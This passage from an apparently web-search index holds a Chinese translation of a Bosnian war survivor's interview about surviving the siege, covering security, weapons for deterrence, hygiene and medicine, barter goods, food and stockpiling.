(\u8428\u57ce\u516c\u56ed\u91cc\u7684\u5893\u5730) 95\u5e74\u7f8e\u56fd\u65a1\u65cb\u4e0b\uff0c\u4ee3\u987f\u548c\u5e73\u534f\u8bae\u7b7e\u8ba2\uff0c\u6ce2\u9ed1\u8fce\u6765\u548c\u5e73\uff0c\u6062\u590d\u91cd\u5efa\uff0c \u90a3\u4e9b\u4e45\u8fdd\u7684\u8b66\u5c40\u7535\u529b\u4ea4\u901a\u901a\u4fe1\u533b\u9662\u8d85\u5e02\u91cd\u8fd4\u57ce\u5e02\u3002 \u8d44\u6e90\u548c\u6280\u80fd Selco\u8ba4\u4e3a\uff0c\u653f\u5e9c\u548c\u5b98\u65b9\u90fd\u4e0d\u53ef\u4fe1\uff0c\u5c40\u9762\u6076\u5316\u65f6\uff0c\u4ed6\u4eec\u7edd\u4e0d\u4f1a\u5168\u529b\u53bb\u963b\u6b62\u5f62\u52bf\u8d70\u5411\u65e0\u53ef\u633d\u56de\uff1b\u4ed6\u4eec\u53ea\u4f1a\u52a8\u7528\u4e00\u5207\u516c\u5171\u8d44\u6e90\u6765\u5ffd\u60a0\u4f60\uff0c\u4ee4\u4f60\u76f8\u4fe1\u4e00\u5207\u90fd\u5f88\u597d\u3002 \u8fd9\u573a\u6218\u4e89\u8ddf\u5b97\u6559\uff0c\u6c11\u65cf\uff0c\u4fe1\u4ef0\u6ca1\u6709\u5173\u7cfb\uff0c\u90a3\u90fd\u662f\u653f\u5ba2\u7684\u5e4c\u5b50\u3002\u5bf9\u4e8e\u4e2a\u4eba\u800c\u8a00\uff0c\u6d3b\u4e0b\u53bb\u624d\u662f\u5173\u952e\uff0c\u53ea\u6709\u5bb6\u5ead\uff0c\u5b97\u65cf\uff0c\u4eb2\u5bc6\u7684\u670b\u53cb\u548c\u90bb\u5c45\uff0c\u662f\u6700\u53ef\u4f9d\u8d56\u7684\u529b\u91cf\u3002\u4e00\u4e9b\u7279\u6b8a\u7684\u4e2a\u4eba\u6280\u80fd\u4f1a\u5f88\u6709\u5e2e\u52a9\uff0cSelco\u6709\u62a4\u58eb\u8d44\u8d28\uff0c\u662f\u6025\u6551\u5458\u3002\u836f\u54c1+\u77e5\u8bc6\u5f88\u503c\u94b1\uff08\u4f46\u836f\u54c1\u6709\u4fdd\u8d28\u671f\uff09\u3002 \u6b64\u5916\uff0c\u673a\u68b0\u7535\u5b50\u4fee\u7406\u6280\u80fd\u4e5f\u80fd\u6d3e\u4e0a\u7528\u573a\u3002\u8fd8\u6709\u4eba\u4f1a\u70bc\u6cb9\u505a\u6cb9\u706f\u3002 \u901a\u4fe1\u4e2d\u65ad\uff0c\u8c23\u8a00\u56db\u8d77\u3002\u6bcf\u4e2a\u4eba\u90fd\u8981\u5b66\u4f1a\u6001\u52bf\u7684\u5224\u65ad\u80fd\u529b\u3002\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u5927\u5bb6\u90fd\u8bf4\u6ca1\u4e8b\u7684\u65f6\u5019\u4f1a\u51fa\u5927\u4e8b\u3002 \uff08\u6027\u522b\uff1a\u5973\uff1b\u4ee3\u53f7\u201c\u7bad\u201d\uff1b\u7279\u957f\uff1a\u5c04\u51fb\u3002\u6ce2\u65af\u5c3c\u4e9a\u5973\u72d9\u51fb\u624b\uff0c\u5965\u6797\u5339\u514b\u5c04\u51fb\u961f\u961f\u5458\uff0c\u5fd7\u613f\u53c2\u52a0\u5e02\u6c11\u6c11\u5175\u7ec4\u7ec7\uff0c\u72d9\u6740\u8fc7\u6570\u5341\u4e2a\u56f4\u57ce\u7684\u585e\u65cf\u72d9\u51fb\u624b\u3002\u2014\u2014\u96be\u4ee5\u7f6e\u4fe1\u7684\u662f\uff0c\u5979\u7684\u6c11\u65cf\u4e5f\u662f\u585e\u65cf\u3002\u5728\u56f4\u56f0\u4e2d\uff0c\u662f\u4fe1\u4efb\u81ea\u5df1\u5468\u56f4\u7684\u4eb2\u53cb\u90bb\u5c45\uff0c\u8fd8\u662f\u4fe1\u4efb\u6240\u8c13\u7684\u793e\u4f1a\u516c\u4ec6\uff0c\u4eba\u6c11\u4ee3\u8868\u5462\uff1f\uff09 \u6b66\u5668\u548c\u5b89\u9632 \u519b\u961f\u5f00\u8fc7\u6765\u7684\u65f6\u5019\uff0c\u653f\u5ba2\u544a\u8bc9\u5e02\u6c11\uff0c\u4ed6\u4eec\u662f\u5b50\u5f1f\u5175\u3002\u4f46\u4e00\u89c9\u9192\u6765\u4ee5\u540e\uff0c\u5927\u5bb6\u5374\u53d1\u73b0\u57ce\u5e02\u5df2\u7ecf\u88ab\u4ed6\u4eec\u56f4\u56f0\u3002\u6218\u4e89\u7206\u53d1\u4e86\uff0c\u6b66\u88c5\u4eba\u5458\u5728\u62c9\u8fbe\u8f7f\u8f66\u4e0a\u88c5\u673a\u67aa\uff0c\u5f88\u591a\u6c11\u5175\u7a7f\u5f97\u548c\u8001\u767e\u59d3\u4e00\u6837\uff0c\u65e0\u6cd5\u533a\u522b\u6b63\u89c4\u519b\u548c\u76d7\u532a\u3002\u52a0\u6cb9\u7ad9\uff0c\u548c\u5546\u5e97\u5f88\u5feb\u5c31\u88ab\u6b79\u5f92\u62a2\u63a0\u4e00\u7a7a\u3002 \uff08\u66fe\u7ecf\u7cbe\u9510\u7684\u4eba\u6c11\u519b\uff0c\u5815\u843d\u4e3a\u4e71\u519b\u6d41\u5bc7\uff0c\u67aa\u6746\u5b50\u91cc\u51fa\u519b\u9600\uff09 \u56f4\u57ce\u671f\u95f4\uff0c\u4e3a\u4e86\u81ea\u4fdd\uff0c\u4e00\u4e9b\u5c0f\u7684\u5bb6\u5ead\u4f1a\u51d1\u6210\u4e00\u5927\u5bb6\u5b50\uff1b\u5982\u679c\u843d\u5355\uff0c\u5219\u5f88\u53ef\u80fd\u4f1a\u88ab\u76d7\u532a\u52ab\u6740\u3002\u5982\u679c\u6709\u4eba\u6765\u88ad\u51fb\uff0c\u8981\u8ba9\u4ed6\u770b\u5230\u4f60\u5bb6\u6709\u5145\u5206\u7684\u51c6\u5907\u3002\u5bb6\u91cc\u65f6\u523b\u67095\u4e2a\u4eba\u503c\u73ed\uff0c\u67091\u4e2a\u4eba\u5728\u4f4f\u5b85\u5916\u9762\u4f5c\u4e3a\u6697\u54e8\u3002\u628a\u5927\u95e8\uff0c\u7a97\u6237\u7528\u6c99\u888b\u5c01\u8d77\u6765\uff1b\u7528\u68af\u5b50\u4ece\u56f4\u5899\u51fa\u5165\u3002\u7531\u4e8e\u767d\u5929\u654c\u519b\u4f1a\u4ee5\u72d9\u51fb\u624b\u548c\u51b7\u70ae\u5c01\u9501\u8857\u9053\uff0c\u591c\u95f4\u6d3b\u52a8\u76f8\u5bf9\u6bd4\u8f83\u5b89\u5168\u3002\u51fa\u5165\u548c\u901a\u8fc7\u8def\u53e3\u4e00\u5b9a\u8981\u5feb\u901f\u2014\u2014\u5728\u8428\u62c9\u70ed\u7a9d\u56f4\u57ce\u671f\u95f4\uff0c\u5e02\u6c11\u8fc7\u9a6c\u8def\u90fd\u662f\u8d70Z\u5b57\u8def\u7ebf\uff0c\u8bd1\u6ce8\u3002 (\u56f4\u57ce\u7684\"\u751f\u5b58\u5730\u56fe\", \u7ea2\u8272\u8868\u793a\u72d9\u51fb\u624b\u6d3b\u52a8\u7684\u533a\u57df) \u6b66\u5668\u65b9\u9762\uff0c\u56f4\u57ce\u671f\u95f4\u4f5c\u8005\u4e00\u5bb6\u56e4\u79ef\u4e86\u4e0d\u5c11\u6b66\u5668\uff083\u652fAK,5\u652f\u624b\u67aa\uff09\u3002\u6709\u4e00\u4e9b\u662f\u901a\u8fc7\u9ed1\u5e02\u83b7\u5f97\u7684\u3002\u4f5c\u8005\u73b0\u5728\u548c\u5e73\u65f6\u671f\uff0c\u6709\u6761\u4ef6\u9009\u62e9\u7684\u60c5\u51b5\u4e0b\uff0c\u968f\u8eab\u5e26\u7684\u662fGlock45\uff0c\u4f46.45ACP\u5f39\u836f\u6bd4\u8f83\u7279\u6b8a\uff0c\u6240\u4ee5\u8fd8\u6709\u4e24\u652f\u4fc4\u56fd\u9020\u7684TT\u624b\u67aa\uff0c\u8fd9\u67aa\u7684\u5b50\u5f39\u5728\u5f53\u5730\u4fbf\u5b9c\u4e14\u5bb9\u6613\u627e\u3002\u53e6\u5916\u4f5c\u8005\u5bb6\u91cc\u4e5f\u50a8\u5907\u4e86AK\u81ea\u52a8\u67aa\uff0c\u5176\u5b50\u5f39\u4f9b\u5e94\u4e5f\u6bd4\u8f83\u5e38\u89c1\u3002(AK\u548cTT\u90fd\u4e0d\u662f\u6027\u80fd\u5f88\u597d\u7684\u88c5\u5907\uff0c\u5728\u8fd9\u91cc\u7684\u610f\u4e49\u4e3b\u8981\u5728\u4e8e\u5a01\u6151\u800c\u4e0d\u662f\u6218\u6597\uff09\u3002\u6700\u597d\u67094\u79cd\u4e0d\u540c\u7684\u6b66\u5668\uff0c2000\u53d1\u6216\u8005\u66f4\u591a\u7684\u5f39\u836f\uff08\u5f53\u5730\u6cd5\u5f8b\u5141\u8bb8\uff09\u3002\u90a3\u4e9b\u9632\u8303\u4e25\u5bc6\uff0c\u6709\u9632\u76d7\u7a97\uff0c\u884c\u4e8b\u9ad8\u8c03\u7684\u4f4f\u5bb6\uff0c\u5f80\u5f80\u6700\u5148\u906d\u76d7\u532a\u3002\u6240\u4ee5\u4fdd\u6301\u4f4e\u8c03\u5176\u5b9e\u6bd4\u5916\u5728\u7684\u8bbe\u65bd\u548c\u6b66\u5668\u88c5\u5907\u66f4\u91cd\u8981\u3002\u7edd\u4e0d\u8981\u8ba9\u532a\u5f92\u76ef\u4e0a\u4f60\u5bb6\u3002 \u536b\u751f\u4e0e\u533b\u7597 Selco\u8ba4\u4e3a\u536b\u751f\u975e\u5e38\u91cd\u8981\uff0c\u751a\u81f3\u8d85\u8fc7\u98df\u7269\uff0c\u8fd9\u53ef\u80fd\u4e0e\u4ed6\u62a4\u58eb\u7684\u804c\u4e1a\u6709\u5173\uff0c\u4f46\u8fd9\u79cd\u89c2\u70b9\u53cd\u5e94\u4e86\u6218\u4e89\u7684\u4e8b\u5b9e\uff0c\u6bd4\u5982\u7b2c\u4e00\u6b21\u6d77\u6e7e\u6218\u4e89\u4e2d\u5f88\u591a\u513f\u7ae5\u7684\u6b7b\u4ea1\u5e76\u975e\u6765\u81ea\u76f4\u63a5\u7684\u6b66\u5668\u6740\u4f24\uff0c\u800c\u662f\u7f3a\u533b\u5c11\u836f\u9020\u6210\u3002 \u8981\u8ba4\u771f\u5b66\u4e60\u6025\u6551\uff0c\u5b66\u4f1a\u5904\u7406\u5916\u4f24\uff0c\u70e7\u4f24\uff0c\u67aa\u51fb\u7b49\uff0c\u5b66\u4f1a\u6ce8\u5c04\u7b49\u6280\u80fd\u3002\u6ca1\u6709\u533b\u9662\uff0c\u6ca1\u6709\u533b\u751f\uff0c\u5373\u4f7f\u6709\u533b\u751f\u4eba\u5bb6\u4e5f\u6ca1\u6cd5\u7ed9\u4f60\u5f00\u836f\u6cbb\u7597\uff0c\u56e0\u4e3a\u836f\u54c1\u548c\u533b\u7597\u5668\u68b0\u90fd\u4e0d\u5177\u5907\u3002 \u7531\u4e8e\u996e\u6c34\u4e0d\u6d01\uff0c\u75e2\u75be\u8179\u6cfb\u53ef\u4ee5\u8f7b\u6613\u5f04\u6b7b\u4eba\uff0c\u9664\u975e\u80fd\u53ca\u65f6\u6cbb\u7597\uff0c\u70b9\u6ef4\u8865\u6c34\u3002\u75e2\u75be\u5bf9\u5c0f\u5b69\u548c\u8001\u5e74\u4eba\u5f88\u5371\u9669\u3002 \u5728\u5916\u4f24\u65b9\u9762\uff0c\u6700\u5e38\u89c1\u7684\u662f\u67aa\u4f24\u3002\u5982\u679c\u80fd\u627e\u5230\u533b\u751f\uff0c\u53ef\u80fd\u6709\u4e09\u6210\u5de6\u53f3\u751f\u8fd8\u7684\u5e0c\u671b\u3002\u4e00\u70b9\u5c0f\u7684\u5272\u4f24\u7684\u611f\u67d3\u5c31\u80fd\u81f4\u547d\u3002 \u5728\u836f\u54c1\u65b9\u9762\uff0c\u6297\u751f\u7d20\u5f88\u7ba1\u7528\u3002Selco\u8fd8\u63a8\u8350\u996e\u6c34\u6d88\u6bd2\u7247\uff0c\u5404\u79cd\u6e05\u6d01\u5de5\u5177\uff0c\u6d17\u6db2\uff0c\u80a5\u7682\uff0c\u6f02\u767d\u5242\uff0c\u6740\u866b\u5242\uff0c\u624b\u5957\uff0c\u53e3\u7f69\u7b49\u5404\u79cd\u536b\u751f\u7528\u54c1\u3002 \u9ec4\u91d1\u767d\u94f6\u4e0e\u6613\u8d27 \u94f6\u884c\u762b\u75ea\u4e86\uff0c\u5404\u79cd\u5361\u5168\u6ca1\u7528\u3002\u6613\u8d27\u4ea4\u6613\u6210\u4e3a\u4e86\u5e02\u573a\u7684\u5f62\u6001\u3002\u4f46\u8981\u6ce8\u610f\uff0c\u4e0d\u5728\u81ea\u5df1\u5bb6\u5468\u56f4\u4ea4\u6613\uff0c\u6bcf\u6b21\u53ea\u5e26\u4e00\u70b9\u70b9\u7269\u54c1\uff0c\u514d\u5f97\u62db\u60f9\u62a2\u63a0\u3002 \u6218\u4e89\u5f00\u59cb\u65f6\uff0c\u57ce\u91cc\u7684\u9152\u5382\u88ab\u70b8\uff0c\u4f5c\u8005\u4ece\u90a3\u91cc\u641e\u6765\u4e86500\u5347\u7684\u5a01\u58eb\u5fcc\u3002\u9152\u7cbe\u53ef\u4ee5\u7528\u6765\u6d88\u6bd2\uff0c\u662f\u5f88\u597d\u7684\u7269\u8d44\uff0c\u6218\u65f6\u6d88\u8017\u975e\u5e38\u5feb\uff0c\u4f5c\u8005\u7528\u5b83\u6765\u4ea4\u6613\u66f4\u9700\u8981\u7684\u7269\u8d44\u3002 \u9ec4\u91d1\uff1f\u4f5c\u8005\u7684\u9ec4\u91d1\u5168\u90e8\u6362\u6210\u4e86\u5b50\u5f39\u3002\u5496\u5561\uff0c\u9999\u70df\u975e\u5e38\u503c\u94b1\u3002\u5395\u7eb8\uff0c\u6781\u5176\u7f3a\u4e4f\uff0c\u5e38\u5e38\u62ff\u6765\u4ea4\u6613\u3002\u8721\u70db\uff0c\u7535\u6c60\u4e5f\u53ef\u4ee5\u50a8\u5907\u4e00\u4e9b\uff0c\u62ff\u6765\u4ea4\u6613\u6362\u98df\u54c1\u3002\u6253\u706b\u673a\uff1a\u5982\u679c\u80fd\u5b581000\u4e2a\u6253\u706b\u673a\uff0c\u8fd9\u4e1c\u897f\u4e0d\u5360\u5730\u65b9\uff0c\u5374\u53ef\u4ee5\u6362\u5f88\u591a\u7269\u54c1\u3002\u76d0\uff0c\u6bd4\u8f83\u91cd\u8981\uff0c\u4f46\u91cf\u4e0d\u5927\uff0c\u6ca1\u6709\u5496\u5561\u8d35\u91cd\u3002\u5ba0\u7269\uff0c\u51e0\u4e4e\u770b\u4e0d\u5230\u3002\u4e5f\u8bb8\u6709\u4eba\u5403\u4e86\u5b83\u4eec\u3002 \u4f5c\u8005\u7236\u4eb2\u7684\u5927\u623f\u5b50\uff0c\u6218\u4e89\u7206\u53d1\u65f6\u9003\u79bb\uff0c\u53ef\u80fd\u662f\u6218\u4e89\u671f\u95f4\u88ab\u96be\u6c11\u8fc1\u5165\uff0c\u6218\u540e\u4e3a\u4e86\u7d22\u56de\uff0c\u6253\u4e86\u56db\u5e74\u5b98\u53f8\uff0c\u4ec5\u4ec5\u662f\u56e0\u4e3a\u4ed6\u7236\u4eb2\u9003\u8d70\u7684\u65f6\u5019\u6ca1\u6709\u5e26\u623f\u5951\u3002\u2014\u2014\u8fd9\u662f\u535a\u4e3b\u53cd\u590d\u5f3a\u8c03\u5728\u758f\u6563\u5305\u91cc\u5907\u8d44\u4ea7\u76f8\u5173\u6587\u4ef6\u7684\u539f\u56e0\uff0c\u8bd1\u6ce8\u3002 \u98df\u54c1\u548c\u71c3\u6599 \u6218\u524d\uff0c\u4ed6\u4eec\u7528\u7535\u5668\u505a\u996d\u3002\u6218\u65f6\uff0cSelco\u4e70\u4e86\u67f4\u706b\u7089\uff0c\u5728\u5c4b\u9876\u67b6\u70df\u7b52\uff0c\u505a\u996d\uff0c\u53d6\u6696\u3002\u590f\u5929\u4ed6\u4eec\u5728\u540e\u9662\u505a\u996d\u3002 \u5927\u7c73\u662f\u6bd4\u8f83\u5bb9\u6613\u70f9\u5236\u7684\u98df\u7269\uff0c\u7701\u71c3\u6599\u3002 \u6709\u4eba\u62c5\u5fc3\u505a\u996d\u7684\u6c14\u5473\u4f1a\u62db\u6765\u654c\u4eba\uff0c\u5b9e\u9645\u662f\u591a\u8651\u4e86\uff0c\u5728\u6c61\u6c34\u904d\u5730\u3001\u81ed\u6c14\u718f\u5929\u7684\u5e9f\u589f\u91cc\uff0c\u505a\u996d\u7684\u6c14\u5473\u5e76\u4e0d\u660e\u663e\u3002 \u50a8\u5907\u7684\u6559\u8bad \u5982\u679c\u8981\u50a8\u5907\uff0c\u5e94\u8be5\u50a8\u5907\u4ec0\u4e48\uff1f\u65e0\u7591\uff0c\u5728\u548c\u5e73\u65f6\u671f\uff0c\u5fc5\u987b\u8981\u4ed4\u7ec6\u50a8\u5907\u3002\u5f88\u591a\u4eba\u9996\u5148\u60f3\u5230\u7684\u662f\u6b66\u5668\uff0c\u5200\u5177\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u98df\u7269\uff0c\u5728\u90a3\u79cd\u60c5\u51b5\u4e0b\u4f60\u5c31\u5815\u843d\u6210\u76d7\u532a\u3002 \u5982\u679c\u7ed9\u4e09\u4e2a\u6708\u7684\u65f6\u95f4\u51c6\u5907\uff0c\u4f5c\u8005\u5efa\u8bae\u50a8\u5907\u516d\u4e2a\u6708\u7684\u98df\u54c1\uff0c\u836f\u54c1\uff0c\u71c3\u6599\u7b49\u3002\u5728\u4e61\u4e0b\u5982\u679c\u6709\u4eb2\u621a\u548c\u623f\u5b50\uff0c\u8981\u91cc\u518d\u50a8\u59076\u4e2a\u6708\u7684\u7269\u8d44\u3002\u623f\u5c4b\u6700\u597d\u8981\u6709\u5927\u7684\u82b1\u56ed\u53ef\u4ee5\u79cd\u690d\u3002 \u4f5c\u8005\u8003\u8651\u7684\u6e05\u5355\u5f88\u8be6\u7ec6\u800c\u5177\u4f53\uff0c\u6709\u6b66\u5668\uff0c\u5f39\u836f\uff0c\u6c34\uff0c\u98df\u7269\uff0c\u836f\u54c1\uff0c\u71c3\u6599\uff08\u7535\u6c60\uff09\u7b49\u3002\u6b66\u5668\uff1a4\u79cd\u4e0d\u540c\u7684\u6b66\u5668\uff0c2000\u53d1\u6216\u8005\u66f4\u591a\u7684\u5f39\u836f\uff08\u5f53\u5730\u6cd5\u5f8b\u5141\u8bb8\uff09\u3002\u6c34\uff1a\u5728\u5c4b\u9876\u5b58\u4e86\u56db\u5927\u6876\u3002\u6cb3\u6c34\u6709\u6c61\u67d3\uff0c\u4f46\u4e0d\u5f97\u4ee5\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u53ea\u597d\u559d\u6cb3\u6c34\u3002\u98df\u7269\u4f5c\u8005\u5e76\u6ca1\u6709\u7279\u6b8a\u5f3a\u8c03\uff0c\u4f46\u63d0\u5230\u4e86\u5927\u7c73\u2014\u2014\u4e00\u822c\u7684\u539f\u5219\u662f\u50a8\u5907\u7c73\u9762\u8c46\u7c7b\u7cd6\u7c7b\u5976\u7c89\u7b49\u5e38\u89c4\u7684\u98df\u54c1\uff0c\u4e0d\u5efa\u8bae\u50a8\u5907\u8fc7\u4e8e\u6602\u8d35\u3001\u5c11\u89c1\u3001\u65b0\u5947\u7684\u98df\u7269\u7c7b\u578b\u3002 \u524d\u9762\u63d0\u5230\u7684\u5404\u7c7b\u536b\u751f\u6d88\u6bd2\u7528\u54c1\u3002\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u50a8\u5907\u4e00\u4e9b\u5c0f\u4e1c\u897f\uff0c\u53ef\u4ee5\u62ff\u6765\u6613\u8d27\u8d38\u6613\uff0c\u5982\u745e\u58eb\u5c0f\u5200\uff0c\u6253\u706b\u673a\u548c\u706b\u77f3\u7b49\u3002\u6c14\u4f53\u6253\u706b\u673a\u4e0d\u5360\u5730\u65b9\uff0c\u5b9e\u9645\u5374\u5f88\u6709\u7528\uff0c\u53ef\u4ee5\u591a\u50a8\u5907\u51e0\u767e\u4e2a\u3002\u9999\u70df\uff0c\u5496\u5561\uff0c\u9152\u7cbe\uff08\u767d\u9152\uff09\u4e5f\u4e0d\u9519\uff0c\u52a3\u8d28\u7684\u767d\u9152\u5728\u5f53\u65f6\u4ecd\u7136\u53d7\u6b22\u8fce\u3002\u4f5c\u8005\u8fd8\u5907\u4e86\u4e00\u4e9b\u6c14\u7f50\uff0c\u7528\u6765\u704c\u6253\u706b\u673a\u6c14\u3002\u8721\u70db\u4e5f\u7528\u6765\u6613\u8d27\u8d38\u6613\u3002 \u8bd1\u8005\u4e2a\u4eba\u603b\u7ed3\uff1a Selco\u5bf9\u5b89\u5168\uff0c\u533b\u7597\uff0c\u50a8\u5907\uff0c\u8d38\u6613\u7684\u63cf\u8ff0\u975e\u5e38\u8be6\u5c3d\uff0c\u662f\u8bbf\u8c08\u6700\u6709\u4ef7\u503c\u7684\u90e8\u5206\uff0c\u5e94\u8be5\u591a\u770b\u3002 \u6ce2\u9ed1\u5185\u6218\u5c5e\u4e8e\u6781\u7aef\u4e25\u9177\u7684\u60c5\u51b5\u3002\u4e2a\u4eba\u8ba4\u4e3a\u56fd\u7834\u5c71\u6cb3\u5728\u90a3\u79cd\u6761\u4ef6\u4e0b\uff0c\u5c3d\u5feb\u5c3d\u4e00\u5207\u624b\u6bb5\u758f\u6563\u4ed6\u4e61\u624d\u662f\u552f\u4e00\u7684\u9009\u62e9\uff0c\u800c\u575a\u5b88\u5219\u5c5e\u4e8e\u6700\u7cdf\u7cd5\u7684\u65b9\u6848\u3002Selco\u4e00\u5bb6\u9009\u62e9\u575a\u5b88\uff0c\u4e3a\u6b64\u4ed8\u51fa2\u4f4d\u5bb6\u4eba\u548c1\u5e74\u975e\u4eba\u751f\u6d3b\u7684\u4ee3\u4ef7\uff0c\u8428\u62c9\u70ed\u7a9d\u7684\u5c45\u6c11\u5219\u5728\u70ae\u53e3\u4e0b\u751f\u6d3b\u4e861500\u591a\u5929\u3002 \u7f8e\u56fd\u786e\u5b9e\u505a\u5bf9\u4e86\u5f88\u591a\u4e8b\u60c5\u3002 \u6765\u6e90\uff1a http://www.tacticalintelligence.net/blog/shtf-survival-qa-a-first-hand-account.htm \u7f16\u8bd1\uff1a\u94f6\u6cb3 \u539f\u6587\u94fe\u63a5\uff1a http://www.mychinese.news/2017/01/a-first-hand-account-of-long-term-shtf.html?m=1","title":"\u6ce2\u9ed1\u56f4\u57ce\u6218\u4e2d\u7684\u5e78\u5b58\u8005"},{"location":"other/%E6%B3%A2%E9%BB%91%E5%9B%B4%E5%9F%8E%E6%88%98%E4%B8%AD%E7%9A%84%E5%B9%B8%E5%AD%98%E8%80%85/#_1","text":"1992\uff5e96\u5e74\u7684\u6ce2\u9ed1\u6218\u4e89\uff0c\u5bf9\u4e8e\u5f88\u591a\u56fd\u4eba\u800c\u8a00\uff0c\u662f\u4e00\u573a\u964c\u751f\u7684\u6218\u4e89\u3002\u524d\u5357\u5404\u65cf\u6b66\u88c5\u5272\u636e\u4e00\u65b9\uff0c\u4e3a\u4e86\u4e89\u593a\u5730\u76d8\uff08\u5c24\u5176\u662f\u585e\u65cf\uff09\u9488\u5bf9\u6ce2\u9ed1\u5e73\u6c11\u5236\u9020\u8fc7\u5f88\u591a\u9a87\u4eba\u542c\u95fb\u7684\u56f4\u56f0\uff0c\u5c60\u57ce\uff0c\u5f3a\u66b4\u548c\u52ab\u63a0\u7b49\u6076\u884c\uff0c\u4f7f\u5f97\u666e\u901a\u4eba\u9677\u5165\u6700\u6076\u52a3\u7684\u751f\u5b58\u707e\u96be\u3002\u585e\u65cf\u519b\u961f\u66fe\u5305\u56f4\u6ce2\u9ed1\u9996\u90fd\u8428\u62c9\u70ed\u7a9d\u957f\u8fbe\u4e09\u5e74\uff0c\u5207\u65ad\u7269\u8d44\u4f9b\u5e94\uff0c\u5e76\u65e5\u591c\u70ae\u51fb\u57ce\u533a\uff0c\u6570\u4e07\u5e02\u6c11\u5728\u72d9\u51fb\u624b\u3001\u75be\u75c5\u548c\u51bb\u997f\u4e2d\u6b7b\u4ea1\u3002 \u672c\u6587\u6765\u81eaSHTFplan.com\u7f51\u7ad9\uff0c\u662f\u4e00\u4e2a\u6ce2\u9ed1\u5e73\u6c11Selco\u7684\u8bbf\u8c08\u5f55\uff0c\u4ed6\u5c45\u4f4f\u5728\u6ce2\u9ed1\u5357\u90e8\u7684\u67d0\u4e2a\u5c0f\u57ce\u5e02\uff0c\u540c\u6837\u7ecf\u5386\u4e861\u5e74\u5de6\u53f3\u7684\u4e71\u519b\u56f4\u57ce\u3002\u8bbf\u8c08\u56f4\u7ed5Selco\u4e00\u5bb615\u53e3\u4eba\u5982\u4f55\u5728\u8fd9\u573a\u4eba\u7978\u4e2d\u751f\u5b58\u7684\u7ecf\u8fc7\uff0c\u5bf9\u6b64\u7c7b\u6001\u52bf\u4e0b\u7684\u751f\u5b58\u95ee\u9898\u8fdb\u884c\u4e86\u63a2\u8ba8\u3002 \u8bbf\u8c08\u7684\u5185\u5bb9\uff0c\u8bd1\u8005\u91cd\u65b0\u6309\u4e3b\u9898\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5408\u5e76\u4e86\u8bb8\u591a\u91cd\u590d\u7684\u8bdd\u9898\u548c\u5185\u5bb9\uff0c\u4ee5\u4fbf\u53c2\u9605\u3002 \u57fa\u672c\u60c5\u51b5 Selco\u8bb2\uff0c\u6218\u4e89\u7206\u53d1\u540e\uff0c\u98df\u7269\uff0c\u6c34\uff0c\u71c3\u6599\uff0c\u7535\u529b\uff0c\u901a\u4fe1\u90fd\u4e2d\u65ad\u4e86\uff0c\u5e02\u653f\u548c\u6cbb\u5b89\u762b\u75ea\uff0c\u533b\u9662\u7684\u533b\u751f\u5927\u90e8\u5206\u9003\u4ea1\uff0c\u836f\u54c1\u548c\u533b\u7597\u5668\u68b0\u7f3a\u4e4f\u4f9b\u5e94\u3002 \u5f88\u591a\u5e02\u6c11\u7f3a\u4e4f\u51c6\u5907\uff0c\u4e09\u4e2a\u6708\u5934\u4e0a\u5c31\u5f00\u59cb\u6709\u4eba\u997f\u6b7b\u3001\u51bb\u6b7b\u6216\u75c5\u6b7b\uff08\u6218\u4e89\u521d\u671f\u5373\u8fdb\u5165\u51ac\u5b63\uff09\u3002 Selco\u7684\u5bb6\u4eba\u4e2d\u67092\u4eba\u56e0\u4e3a\u559d\u810f\u6c34\u96e8\u6c34\u75c5\u6b7b\u3002\u4e00\u70b9\u70b9\u5c0f\u7684\u75be\u75c5\u5c31\u80fd\u8981\u547d\u3002 \u867d\u7136\u7f8e\u56fd\u4eba\u6bcf\u9694\u5341\u51e0\u5929\u7a7a\u6295\u4e00\u6b21\u98df\u54c1\uff0c\u4f46\u663e\u7136\u8fdc\u8fdc\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\u3002\u5e02\u6c11\u4e2d\u5c11\u6570\u7684\u4e00\u4e9b\u5bb6\u5ead\u4f1a\u79cd\u83dc\uff0c\u6709\u65f6\u5019\u5076\u5c14\u80fd\u6293\u5230\u9e3d\u5b50\u548c\u5154\u5b50\u3002\u5728\u4e61\u4e0b\u60c5\u51b5\u5219\u597d\u5f88\u591a\u3002 \u6c7d\u6cb9\u6bd4\u9ec4\u91d1\u8fd8\u8d35\uff0c\u6c7d\u8f66\u51e0\u4e4e\u65e0\u7528\u3002\u8d27\u5e01\u8d2c\u503c\u98de\u5feb\uff0c\u94b1\u4ec0\u4e48\u4e5f\u4e70\u4e0d\u5230\uff0c\u7269\u7269\u4ea4\u6613\u91cd\u73b0\u3002\u4eba\u4eec\u7684\u751f\u6d3b\u56de\u5230\u4e86\u77f3\u5668\u65f6\u4ee3\uff0c\u8bb8\u591a\u4eba\u62c6\u623f\u5c4b\u7684\u95e8\u7a97\u3001\u5bb6\u5177\u505a\u67f4\u706b\uff0c\u516c\u56ed\u7684\u6811\u6728\u5f88\u5feb\u5c31\u70e7\u5b8c\u4e86\uff0c\u968f\u540e\u90a3\u91cc\u53c8\u6210\u4e86\u5893\u5730\uff0c\u7528\u6765\u8349\u8349\u57cb\u846c\u6b7b\u53bb\u7684\u4eba\u4eec\u3002\u6218\u540e\u4eba\u4eec\u91cd\u65b0\u8fc1\u575f\uff0c\u90a3\u662f\u540e\u8bdd\u4e86\u3002 (\u8428\u57ce\u516c\u56ed\u91cc\u7684\u5893\u5730) 95\u5e74\u7f8e\u56fd\u65a1\u65cb\u4e0b\uff0c\u4ee3\u987f\u548c\u5e73\u534f\u8bae\u7b7e\u8ba2\uff0c\u6ce2\u9ed1\u8fce\u6765\u548c\u5e73\uff0c\u6062\u590d\u91cd\u5efa\uff0c \u90a3\u4e9b\u4e45\u8fdd\u7684\u8b66\u5c40\u7535\u529b\u4ea4\u901a\u901a\u4fe1\u533b\u9662\u8d85\u5e02\u91cd\u8fd4\u57ce\u5e02\u3002 \u8d44\u6e90\u548c\u6280\u80fd 